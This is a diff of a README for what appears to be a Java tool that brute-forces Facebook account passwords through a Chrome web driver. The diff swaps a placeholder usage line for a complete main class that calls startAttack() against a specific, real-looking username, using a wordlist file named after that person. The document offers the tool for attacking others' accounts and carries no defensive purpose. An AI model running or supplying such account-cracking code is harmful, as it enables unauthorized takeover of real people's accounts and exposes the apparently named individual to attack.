@@ -18,5 +18,15 @@ Facebook brute force attack on users accounts with ***Java***.
 **In Code**.<br>
 
 ''
-FaceBruteForce faceBruteForce = new FaceBruteForce("username.example.15", "D:\MyFiles\WordLists\target_1.txt","D:\MyFiles\WebDrivers\chromedriver.exe");
+public class GetStarted {
+
+    public static void main (String[] args) {
+        FaceBruteForce faceBruteForce = new FaceBruteForce(
+                "hanaa.essaid.9",
+                "D:\\MY_JAVA_PROJECTS\\FacebookBruteForce\\src\\com\\mejidprojects\\facebruteforce\\hanaa.txt",
+                "C://webdrivers//chromedriver.exe"
+        );
+        faceBruteForce.startAttack();
+    }
+}
 ''
